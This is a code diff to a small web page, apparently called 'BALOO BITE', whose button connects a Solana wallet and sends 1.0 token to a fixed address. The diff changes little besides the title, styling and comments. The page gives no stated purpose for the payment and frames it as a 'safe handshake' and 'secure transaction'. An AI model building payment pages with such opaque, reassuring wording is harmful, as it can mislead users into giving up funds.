@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BALOO BITE - TECHNICAL MASTER</title>
+    <title>BALOO BITE - V6 STABILITY</title>
     <style>
         body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #0a0a0a; border: 2px solid #333; border-radius: 15px; padding: 30px; text-align: center; width: 350px; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
+        .card { background: #0a0a0a; border: 2px solid #333; border-radius: 15px; padding: 30px; text-align: center; width: 350px; }
         .status-box { background: #001a00; color: #00ff00; padding: 15px; border: 1px solid #00ff00; font-size: 11px; margin-bottom: 25px; text-align: left; min-height: 80px; word-break: break-all; line-height: 1.4; }
         .btn-chomp { background: #ff8c00; color: #fff; border: none; padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 18px; border-radius: 8px; text-transform: uppercase; transition: 0.3s; }
         .btn-chomp:disabled { background: #222; color: #666; cursor: not-allowed; }
@@ -37,7 +37,7 @@
             btn.disabled = true;
             log.innerHTML = "STATUS: INITIALIZING SAFE HANDSHAKE...";
             
-            // Reconnect to ensure session is fresh
+            // Reconnect logic to prevent session timeouts
             await provider.connect();
 
             log.innerHTML = "STATUS: BUILDING SECURE TRANSACTION...";
@@ -46,18 +46,16 @@
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: provider.publicKey,
                     toPubkey: new solanaWeb3.PublicKey("BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq"),
-                    lamports: 1.0 * 1e9 // 1.0 XNT
+                    lamports: 1.0 * 1e9 
                 })
             );
 
             log.innerHTML = "STATUS: AWAITING USER APPROVAL...<br>CHECK YOUR WALLET POPUP!";
             
-            // Let the wallet handle blockhash and transmission
             const result = await provider.signAndSendTransaction(transaction);
             const signature = result.signature || result;
 
             log.innerHTML = "VERIFIED SUCCESS!<br>SIG: " + signature.toString().substring(0, 22);
-            console.log("Transaction Signature:", signature);
 
         } catch (err) {
             console.error(err);
@@ -67,7 +65,7 @@
                 log.innerHTML = "ERROR: " + err.message.toUpperCase();
             }
         } finally {
-            // Cool-down period to prevent 'Plugin Closed' on next click
+            // Cool-down timer to keep the wallet stable
             let countdown = 5;
             const timer = setInterval(() => {
                 btn.innerText = `WAIT (${countdown}s)`;
